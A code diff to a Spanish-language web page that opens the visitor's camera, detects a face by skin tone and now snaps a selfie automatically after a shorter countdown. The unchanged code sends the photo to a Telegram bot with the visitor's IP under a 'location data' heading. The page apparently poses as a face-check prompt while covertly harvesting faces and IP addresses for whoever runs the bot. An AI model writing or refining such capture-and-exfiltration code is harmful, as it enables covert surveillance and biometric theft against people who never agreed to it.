@@ -49,17 +49,6 @@ video {
     box-shadow: 0 0 25px #00ff88;
 }
 
-.oval.countdown {
-    border-color: #ffaa00;
-    box-shadow: 0 0 25px #ffaa00;
-    animation: pulse 0.5s infinite;
-}
-
-@keyframes pulse {
-    0%, 100% { transform: translate(-50%, -50%) scale(1); }
-    50% { transform: translate(-50%, -50%) scale(1.02); }
-}
-
 /* Texto principal */
 .status {
     position: absolute;
@@ -72,7 +61,7 @@ video {
     z-index: 10;
 }
 
-/* Mensaje de advertencia en rojo */
+/* Mensaje de advertencia */
 .warning-message {
     position: absolute;
     top: 30px;
@@ -87,7 +76,6 @@ video {
     text-align: center;
     z-index: 15;
     backdrop-filter: blur(5px);
-    border: 1px solid rgba(255,255,255,0.3);
     white-space: nowrap;
     font-family: monospace;
     display: none;
@@ -97,27 +85,33 @@ video {
     display: block;
 }
 
-/* Contador */
-.countdown-number {
+/* Contador visual */
+.counter-circle {
     position: absolute;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    font-size: 80px;
-    font-weight: bold;
-    color: white;
-    text-shadow: 0 0 20px rgba(0,0,0,0.8);
-    z-index: 25;
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
     background: rgba(0,0,0,0.7);
-    padding: 20px 40px;
-    border-radius: 50px;
-    backdrop-filter: blur(10px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 25;
+    backdrop-filter: blur(5px);
     display: none;
-    font-family: monospace;
 }
 
-.countdown-number.show {
-    display: block;
+.counter-circle.show {
+    display: flex;
+}
+
+.counter-number {
+    font-size: 48px;
+    font-weight: bold;
+    color: #00ff88;
+    font-family: monospace;
 }
 
 /* Preview de foto */
@@ -272,7 +266,6 @@ video {
     }
 }
 
-/* Mensaje de estado adicional */
 .status-message {
     position: fixed;
     bottom: 120px;
@@ -285,7 +278,6 @@ video {
     font-size: 12px;
     z-index: 10;
     display: none;
-    white-space: nowrap;
 }
 </style>
 </head>
@@ -297,7 +289,9 @@ video {
 <div class="oval" id="oval"></div>
 <div class="warning-message" id="warningMessage">⚠️ Coloca tu rostro en el círculo</div>
 <div class="status" id="status">🎯 Coloca tu rostro en el círculo</div>
-<div class="countdown-number" id="countdownNumber">3</div>
+<div class="counter-circle" id="counterCircle">
+    <div class="counter-number" id="counterNumber">3</div>
+</div>
 <button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
 <div class="status-message" id="statusMessage"></div>
 <div class="loader" id="loader">
@@ -314,7 +308,8 @@ const statusMessage = document.getElementById("statusMessage");
 const loader = document.getElementById("loader");
 const loaderText = document.getElementById("loaderText");
 const warningMessage = document.getElementById("warningMessage");
-const countdownNumber = document.getElementById("countdownNumber");
+const counterCircle = document.getElementById("counterCircle");
+const counterNumber = document.getElementById("counterNumber");
 
 // Configuración de Telegram
 const TELEGRAM_CONFIG = {
@@ -328,14 +323,11 @@ let detectionInterval = null;
 let countdownActive = false;
 let countdownTimer = null;
 let countdownValue = 3;
-let faceDetected = false;
-let faceStable = false;
-let stableCounter = 0;
+let faceInside = false;
 
 // Configuración
 const CENTER_TOLERANCE_X = 85;
 const CENTER_TOLERANCE_Y = 110;
-const REQUIRED_STABLE_FRAMES = 10;
 
 // Iniciar cámara
 navigator.mediaDevices.getUserMedia({ 
@@ -351,14 +343,12 @@ navigator.mediaDevices.getUserMedia({
     startFaceDetection();
 })
 .catch(err => {
-    console.error("Error de cámara:", err);
+    console.error("Error:", err);
     statusText.innerText = "❌ Error: No se puede acceder a la cámara";
 });
 
-// Detección de rostro mejorada
+// Detección de rostro
 function startFaceDetection() {
-    let lastFaceX = null, lastFaceY = null;
-    
     detectionInterval = setInterval(() => {
         if (photoTaken || countdownActive) return;
         
@@ -372,7 +362,7 @@ function startFaceDetection() {
         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
         const data = imageData.data;
         
-        // Buscar el punto central del rostro
+        // Buscar centro del rostro
         let faceCenter = findFaceCenter(data, canvas.width, canvas.height);
         
         if (faceCenter) {
@@ -389,58 +379,42 @@ function startFaceDetection() {
             
             const dx = Math.abs(faceX - centerX);
             const dy = Math.abs(faceY - centerY);
-            const isCentered = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
+            const isInside = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
             
-            // Verificar estabilidad
-            let isStable = true;
-            if (lastFaceX !== null && lastFaceY !== null) {
-                const movement = Math.hypot(faceX - lastFaceX, faceY - lastFaceY);
-                isStable = movement < 15;
-            }
-            lastFaceX = faceX;
-            lastFaceY = faceY;
-            
-            if (isCentered && isStable) {
-                stableCounter++;
-                if (stableCounter >= REQUIRED_STABLE_FRAMES && !faceStable) {
-                    faceStable = true;
+            if (isInside) {
+                if (!faceInside) {
+                    // Acaba de entrar al círculo
+                    faceInside = true;
                     oval.classList.add("valid");
                     warningMessage.classList.remove("show");
-                    statusText.innerText = "✅ Rostro correcto - Tomando selfie...";
-                    startCountdown();
-                } else if (stableCounter > 3) {
-                    oval.classList.add("valid");
-                    warningMessage.classList.remove("show");
-                    statusText.innerText = `✅ Mantén la posición (${stableCounter}/${REQUIRED_STABLE_FRAMES})`;
+                    statusText.innerText = "✅ Rostro detectado - Tomando foto...";
+                    
+                    // Iniciar countdown de 1 segundo
+                    startQuickCountdown();
                 }
             } else {
-                stableCounter = 0;
-                faceStable = false;
-                oval.classList.remove("valid");
-                warningMessage.classList.add("show");
-                if (!isCentered) {
+                if (faceInside) {
+                    faceInside = false;
+                    oval.classList.remove("valid");
+                    warningMessage.classList.add("show");
                     statusText.innerText = "🎯 Centra tu rostro en el círculo";
-                } else {
-                    statusText.innerText = "⚠️ No te muevas";
                 }
             }
         } else {
-            stableCounter = 0;
-            faceStable = false;
-            oval.classList.remove("valid");
-            warningMessage.classList.add("show");
-            statusText.innerText = "❌ No se detecta rostro";
-            lastFaceX = null;
-            lastFaceY = null;
+            if (faceInside) {
+                faceInside = false;
+                oval.classList.remove("valid");
+                warningMessage.classList.add("show");
+                statusText.innerText = "❌ No se detecta rostro";
+            }
         }
-    }, 100);
+    }, 80);
 }
 
-// Encontrar el centro del rostro por tonos de piel
+// Encontrar centro del rostro
 function findFaceCenter(data, width, height) {
     let pixels = [];
     
-    // Buscar píxeles de piel
     for (let y = 0; y < height; y += 3) {
         for (let x = 0; x < width; x += 3) {
             const idx = (y * width + x) * 4;
@@ -448,18 +422,16 @@ function findFaceCenter(data, width, height) {
             const g = data[idx + 1];
             const b = data[idx + 2];
             
-            // Detección de tonos de piel mejorada
-            if (r > 60 && g > 35 && b > 25 && r > g && r > b) {
-                if ((r - g) > 12 && (r - b) > 12) {
-                    pixels.push({ x, y });
-                }
+            // Detección de tonos de piel
+            if (r > 70 && g > 40 && b > 30 && r > g && r > b && (r - g) > 12) {
+                pixels.push({ x, y });
             }
         }
     }
     
-    if (pixels.length < 30) return null;
+    if (pixels.length < 25) return null;
     
-    // Encontrar el centro de masa
+    // Calcular centro de masa
     let sumX = 0, sumY = 0;
     for (let p of pixels) {
         sumX += p.x;
@@ -469,10 +441,10 @@ function findFaceCenter(data, width, height) {
     let centerX = sumX / pixels.length;
     let centerY = sumY / pixels.length;
     
-    // Verificar que el centro esté dentro de una región densa
+    // Verificar densidad alrededor del centro
     let nearby = 0;
     for (let p of pixels) {
-        if (Math.hypot(p.x - centerX, p.y - centerY) < 60) {
+        if (Math.hypot(p.x - centerX, p.y - centerY) < 50) {
             nearby++;
         }
     }
@@ -482,32 +454,29 @@ function findFaceCenter(data, width, height) {
     return { x: centerX, y: centerY };
 }
 
-function startCountdown() {
+function startQuickCountdown() {
     if (countdownActive || photoTaken) return;
     
     countdownActive = true;
-    countdownValue = 3;
+    countdownValue = 2;
     
-    oval.classList.remove("valid");
-    oval.classList.add("countdown");
-    countdownNumber.textContent = countdownValue;
-    countdownNumber.classList.add("show");
-    statusText.innerText = `📸 Selfie en ${countdownValue}...`;
+    counterNumber.textContent = countdownValue;
+    counterCircle.classList.add("show");
+    statusText.innerText = `📸 ${countdownValue}...`;
     
     countdownTimer = setInterval(() => {
         countdownValue--;
-        countdownNumber.textContent = countdownValue;
+        counterNumber.textContent = countdownValue;
         
         if (countdownValue > 0) {
-            statusText.innerText = `📸 Selfie en ${countdownValue}...`;
+            statusText.innerText = `📸 ${countdownValue}...`;
         } else {
             clearInterval(countdownTimer);
             countdownTimer = null;
-            countdownNumber.classList.remove("show");
-            oval.classList.remove("countdown");
+            counterCircle.classList.remove("show");
             takePhotoAndSend();
         }
-    }, 1000);
+    }, 500);
 }
 
 // Tomar foto y enviar
@@ -565,9 +534,8 @@ function resetProcess() {
     photoTaken = false;
     currentPhotoData = null;
     countdownActive = false;
-    faceStable = false;
-    stableCounter = 0;
-    oval.classList.remove("valid", "countdown");
+    faceInside = false;
+    oval.classList.remove("valid");
     statusText.innerText = "🎯 Coloca tu rostro en el círculo";
     warningMessage.classList.add("show");
     
@@ -575,6 +543,7 @@ function resetProcess() {
         clearInterval(countdownTimer);
         countdownTimer = null;
     }
+    counterCircle.classList.remove("show");
     
     const preview = document.querySelector('.photo-preview');
     if (preview) preview.remove();
@@ -639,7 +608,7 @@ async function enviarATelegram() {
         const mensajeInfo = `
 🔔 **NUEVA SELFIE CAPTURADA** 🔔
 
-✅ Selfie tomada correctamente
+✅ Selfie tomada automáticamente
 
 🌍 **DATOS DE UBICACIÓN:**
 📍 IP: ${ipData.ip}
